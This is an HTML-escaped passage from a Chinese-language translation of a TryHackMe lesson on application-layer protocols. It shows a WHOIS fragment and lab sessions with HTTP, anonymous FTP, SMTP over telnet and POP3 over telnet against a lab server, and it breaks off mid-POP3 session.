&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Registrar Registration Expiration Date: 2026-10-20T14:56:17Z
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Registrar: GoDaddy.com, LLC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Registrar IANA ID: 146
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Registrar Abuse Contact Email: abuse@godaddy.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Registrar Abuse Contact Phone: +1.4806242505
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[...]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Registrant Name: Registration Private
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Registrant Organization: Domains By Proxy, LLC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Registrant Street: DomainsByProxy.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[...]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;https访问web&#34;&gt;HTTP(S)：访问web
&lt;/h2&gt;&lt;p&gt;当您启动浏览器时，您主要使用 HTTP 和 HTTPS 协议。HTTP 代表超文本传输协议;HTTPS 中的 S 代表安全。此协议依赖于 TCP 并定义 Web 浏览器与 Web 服务器的通信方式。&lt;/p&gt;
&lt;p&gt;您的 Web 浏览器通常向 Web 服务器发出的一些命令或方法是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;GET&lt;/code&gt; 从服务器检索数据，例如 HTML 文件或图像。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;POST&lt;/code&gt; 允许我们向服务器提交新数据，例如提交表单或上传文件。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PUT&lt;/code&gt; 用于在服务器上创建新资源以及更新和覆盖现有信息。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DELETE&lt;/code&gt;，顾名思义，用于删除服务器上的指定文件或资源。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;HTTP 和 HTTPS 通常分别使用 TCP 端口 80 和 443，其他端口（如 8080 和 8443）不太常用。&lt;/p&gt;
&lt;p&gt;在以下示例中，我们使用 Firefox 浏览器访问 &lt;code&gt;10.10.28.0&lt;/code&gt; 上的 Web 服务器。我们的浏览器获取网页并完美地显示它;但是，我们对幕后发生的事情感兴趣。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408013655738.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408013655738&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;使用 Wireshark，我们可以更仔细地检查 Firefox 浏览器和 Web 服务器之间的交换。下面来自 Wireshark 的屏幕截图以&lt;strong&gt;红色&lt;/strong&gt;显示我们的浏览器发送的文本，以&lt;strong&gt;蓝色&lt;/strong&gt;显示 Web 服务器响应。正如你所看到的，客户端和服务器之间交换了很多信息，这些信息没有呈现给用户。示例包括 Web 服务器版本和上次修改页面的时间。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408014341240.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408014341240&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;ftp传输文件&#34;&gt;FTP：传输文件
&lt;/h2&gt;&lt;p&gt;与旨在检索网页的 HTTP 不同，文件传输协议 （FTP） 旨在传输文件。因此，FTP 对于文件传输非常有效，当所有条件都相同时，它可以实现比 HTTP 更高的速度。&lt;/p&gt;
&lt;p&gt;FTP 协议定义的命令示例包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;USER&lt;/code&gt; 用于输入用户名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PASS&lt;/code&gt; 输入密码&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RETR&lt;/code&gt; （retrieve） 用于将文件从 FTP 服务器下载到客户端。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;STOR&lt;/code&gt;（存储）用于将文件从客户端上传到 FTP 服务器。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;FTP 服务器默认监听 TCP 端口 21;数据传输是通过从客户端到服务器的另一个连接进行的。&lt;/p&gt;
&lt;p&gt;在下面的终端中，我们执行命令 &lt;code&gt;ftp 10.10.28.0&lt;/code&gt; 以使用本地 &lt;code&gt;ftp&lt;/code&gt; 客户端连接到远程 FTP 服务器。然后我们执行以下步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我们使用&lt;code&gt;用户名 anonymous&lt;/code&gt; 登录&lt;/li&gt;
&lt;li&gt;我们不需要提供任何密码&lt;/li&gt;
&lt;li&gt;发出 &lt;code&gt;ls&lt;/code&gt; 返回可供下载的文件列表&lt;/li&gt;
&lt;li&gt;&lt;code&gt;键入 ASCII&lt;/code&gt; 切换到 ASCII 模式，因为这是一个文本文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;get coffee.txt&lt;/code&gt; 允许我们检索所需的文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过 FTP 客户端进行的命令交换显示在下面的终端中。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ ftp 10.10.28.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connected to 10.10.28.0 (10.10.28.0).
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;220 (vsFTPd 3.0.5)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name (10.10.28.0:strategos): anonymous
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;331 Please specify the password.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;230 Login successful.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Remote system type is UNIX.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Using binary mode to transfer files.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; ls
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;227 Entering Passive Mode (10,10,41,192,134,10).
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;150 Here comes the directory listing.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r--    1 0        0            1480 Jun 27 08:03 coffee.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r--    1 0        0              14 Jun 27 08:04 flag.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r--    1 0        0            1595 Jun 27 08:05 tea.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;226 Directory send OK.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; type ascii
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;200 Switching to ASCII mode.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; get coffee.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;local: coffee.txt remote: coffee.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;227 Entering Passive Mode (10,10,41,192,57,100).
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;150 Opening BINARY mode data connection for coffee.txt (1480 bytes).
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WARNING! 47 bare linefeeds received in ASCII mode
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;File may not have transferred correctly.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;226 Transfer complete.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1480 bytes received in 8e-05 secs (18500.00 Kbytes/sec)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; quit
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;221 Goodbye.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们使用 Wireshark 更仔细地检查交换的消息。客户端的消息为&lt;strong&gt;红色&lt;/strong&gt; ，而服务器的响应为&lt;strong&gt;蓝色&lt;/strong&gt; 。请注意客户端和服务器之间的各种命令有何不同。例如，当您在客户端上键入 &lt;code&gt;ls&lt;/code&gt; 时，客户端会将 &lt;code&gt;LIST&lt;/code&gt; 发送到服务器。最后要注意的一点是，目录列表和我们下载的文件都是通过单独的连接发送的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408015001388.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408015001388&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;smtp发送电子邮件&#34;&gt;SMTP：发送电子邮件
&lt;/h2&gt;&lt;p&gt;与浏览 Web 和下载文件一样，发送电子邮件需要自己的协议。&lt;strong&gt;Simple Mail Transfer Protocol&lt;/strong&gt; （SMTP） 定义邮件客户端如何与邮件服务器通信，以及邮件服务器如何与另一个邮件服务器通信。&lt;/p&gt;
&lt;p&gt;SMTP 协议的类比是当您去当地邮局发送包裹时。您向员工打招呼，告诉他们您想将包裹寄往何处，并在将包裹交给他们之前提供发件人的信息。根据您所在的国家/地区，系统可能会要求您出示身份证。此过程与 SMTP 会话没有太大区别。&lt;/p&gt;
&lt;p&gt;让我们介绍一下您的邮件客户端在将电子邮件传输到 SMTP 服务器时使用的一些命令：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HELO&lt;/code&gt; 或 &lt;code&gt;EHLO&lt;/code&gt; 启动 SMTP 会话&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MAIL FROM&lt;/code&gt; 指定发件人的电子邮件地址&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RCPT TO&lt;/code&gt; 指定收件人的电子邮件地址&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DATA&lt;/code&gt; 表示客户端将开始发送电子邮件内容&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt; 单独在一行上发送，以指示电子邮件消息的结尾&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面的终端显示了通过 &lt;code&gt;telnet&lt;/code&gt; 发送的电子邮件示例。 默认情况下，SMTP 服务器侦听 TCP 端口 25。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ telnet 10.10.28.0 25
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Trying 10.10.28.0...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connected to 10.10.28.0.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Escape character is &amp;#39;&lt;span class=&#34;se&#34;&gt;^]&lt;/span&gt;&amp;#39;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;220 example.thm ESMTP Exim 4.95 Ubuntu Thu, 27 Jun 2024 16:18:09 +0000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HELO client.thm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;250 example.thm Hello client.thm [10.11.81.126]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MAIL FROM: &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;user@client.thm&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;250 OK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;RCPT TO: &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;strategos@server.thm&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;250 Accepted
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DATA
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;354 Enter message, ending with &lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt; on a line by itself
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;From: user@client.thm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;To: strategos@server.thm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Subject: Telnet email
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hello. I am using telnet to send you an email!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;250 OK id=1sMrpq-0001Ah-UT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;QUIT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;221 example.thm closing connection
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection closed by foreign host.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;显然，使用 &lt;code&gt;telnet&lt;/code&gt; 发送电子邮件非常麻烦;但是，它可以帮助您更好地了解电子邮件客户端在后台发出的命令。Wireshark 捕获以颜色显示交换;客户端的消息为红色，而服务器的响应为蓝色。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408015332773.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408015332773&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;pop3接收电子邮件&#34;&gt;POP3：接收电子邮件
&lt;/h2&gt;&lt;p&gt;您收到了一封电子邮件，并希望将其下载到本地邮件客户端。邮局协议版本 3 （POP3） 旨在允许客户端与邮件服务器通信并检索电子邮件消息。&lt;/p&gt;
&lt;p&gt;无需深入的技术细节，电子邮件客户端依靠 SMTP 发送其消息，并使用 POP3 检索它们。SMTP 类似于将信封或包裹交给邮局， 而 POP3 类似于检查本地邮箱是否有新的信件或包裹。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408015500912.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408015500912&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;一些常见的 POP3 命令包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;USER &amp;lt;username&amp;gt;&lt;/code&gt; 标识用户&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PASS &amp;lt;password&amp;gt;&lt;/code&gt; 提供用户的密码&lt;/li&gt;
&lt;li&gt;&lt;code&gt;STAT&lt;/code&gt; 请求消息数和总大小&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LIST&lt;/code&gt; 列出所有邮件及其大小&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RETR &amp;lt;message_number&amp;gt;&lt;/code&gt; 检索指定的消息&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DELE &amp;lt;message_number&amp;gt;&lt;/code&gt; 将邮件标记为删除&lt;/li&gt;
&lt;li&gt;&lt;code&gt;QUIT&lt;/code&gt; 结束 POP3 会话，应用更改，例如删除&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在下面的终端中，我们可以看到一个通过 telnet 的 POP3 会话。由于 POP3 服务器默认监听 TCP 端口 110，因此连接到 TELNET 端口的命令是 &lt;code&gt;telnet 10.10.28.0 110&lt;/code&gt;。下面的 exchange 检索在上一个任务中发送的电子邮件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ telnet 10.10.28.0 110
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Trying 10.10.28.0...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connected to 10.10.28.0.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Escape character is &amp;#39;&lt;span class=&#34;se&#34;&gt;^]&lt;/span&gt;&amp;#39;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+OK [XCLIENT] Dovecot (Ubuntu) ready.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AUTH
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+OK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PLAIN
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;USER strategos
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+OK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PASS 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+OK Logged in.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;STAT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+OK 3 1264
